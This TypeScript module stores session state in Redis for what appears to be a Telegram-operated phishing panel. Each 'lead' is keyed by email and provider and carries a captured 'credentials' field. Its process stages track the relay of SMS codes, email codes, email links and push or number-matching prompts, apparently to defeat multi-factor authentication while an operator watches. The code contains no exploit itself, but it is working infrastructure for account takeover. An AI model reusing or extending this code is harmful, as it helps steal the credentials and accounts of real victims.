import { createHash } from "node:crypto";
import type { InlineKeyboardMarkup } from "@grammyjs/types";
import { redis } from "../clients/upstash.client.js";

export type LeadStatus =
  | "idle"
  | "loading"
  | "passing"
  | "flagged"
  | "completed"
  | "failed";

export type LeadProcess =
  | "init"
  | "auth"
  | "verify-sms-code"
  | "verify-email-code"
  | "verify-email-link"
  | "verify-prompt-yes"
  | "verify-prompt-num";

export type LeadSession = {
  sessionId: string;
  chatId?: number;
  messageId?: number;
  keyboard?: InlineKeyboardMarkup;
  status: LeadStatus;
  process: LeadProcess;
  feedback: string;
  overload: string[];
  notification: string;
  credentials: string;
  logs: string;
};

const LEAD_SESSION_TTL_SECONDS = 60 * 60;

export function getLeadIdentity(lead: {
  email: string;
  provider: string;
}): string {
  return createHash("sha256")
    .update(
      JSON.stringify([
        lead.email.trim().toLowerCase(),
        lead.provider.trim().toLowerCase(),
      ]),
    )
    .digest("hex")
    .slice(0, 8);
}

export async function readLeadSession(
  sessionId: string,
): Promise<LeadSession | null> {
  if (!sessionId) return null;
  return redis.get<LeadSession>(`ls-${sessionId}`);
}

export async function writeLeadSession(
  sessionId: string,
  config: {
    merge?: true;
    keepState?: true;
    keepStanding?: true;
    keepFramework?: true;
    status?: LeadStatus;
    process?: LeadProcess;
    feedback?: string;
    notification?: string;
  },
): Promise<LeadSession> {
  const merge = config.merge === true;
  const keepState = config.keepState === true;
  const keepStanding = config.keepStanding === true;
  const keepFramework = config.keepFramework === true;
  const existing =
    merge || keepState || keepStanding || keepFramework
      ? await readLeadSession(sessionId)
      : null;
  const session: LeadSession = {
    sessionId: existing?.sessionId ?? sessionId,
    messageId: existing?.messageId,
    keyboard:
      merge || keepState //
        ? existing?.keyboard
        : undefined,
    status:
      config.status ??
      (merge || keepState //
        ? existing?.status
        : undefined) ??
      "idle",
    process:
      config.process ??
      (merge || keepState //
        ? existing?.process
        : undefined) ??
      "init",
    feedback:
      config.feedback ??
      (merge || keepState //
        ? existing?.feedback
        : undefined) ??
      "Initializing...",
    overload: merge ? (existing?.overload ?? []) : [],
    notification:
      config.notification ??
      (merge || keepState || keepStanding || keepFramework //
        ? existing?.notification
        : undefined) ??
      "",
    credentials:
      (merge || keepState || keepFramework //
        ? existing?.credentials
        : undefined) ?? "",
    logs: merge ? (existing?.logs ?? "") : "",
  };
  await redis.set(`ls-${sessionId}`, session, {
    ex: LEAD_SESSION_TTL_SECONDS,
  });
  return session;
}

export async function updateLeadSession(
  sessionId: string,
  update: {
    messageId?: number | null;
    keyboard?: InlineKeyboardMarkup | null;
    status?: LeadStatus;
    process?: LeadProcess;
    feedback?: string;
    overload?: string[];
    credentials?: string;
    logEntry?: string | string[];
  },
): Promise<LeadSession | null> {
  const session = await readLeadSession(sessionId);
  if (!session) return null;
  if (update.messageId !== undefined) {
    session.messageId = update.messageId ?? undefined;
  }
  if (update.keyboard !== undefined) {
    session.keyboard = update.keyboard ?? undefined;
  }
  if (update.status) session.status = update.status;
  if (update.process) session.process = update.process;
  if (update.feedback) session.feedback = update.feedback;
  if (update.overload) {
    session.overload = [...(session.overload ?? []), ...update.overload];
  }
  if (update.credentials) session.credentials = update.credentials;
  if (update.logEntry) {
    if (Array.isArray(update.logEntry)) {
      const entries = update.logEntry.map((l) => l.trim()).filter(Boolean);
      session.logs = `${session.logs ?? ""}\n\n${entries.join("\n\n")}`.trim();
    } else {
      session.logs = `${session.logs ?? ""}\n\n${update.logEntry}`.trim();
    }
  }
  await redis.set(`ls-${sessionId}`, session, {
    ex: LEAD_SESSION_TTL_SECONDS,
  });
  return session;
}
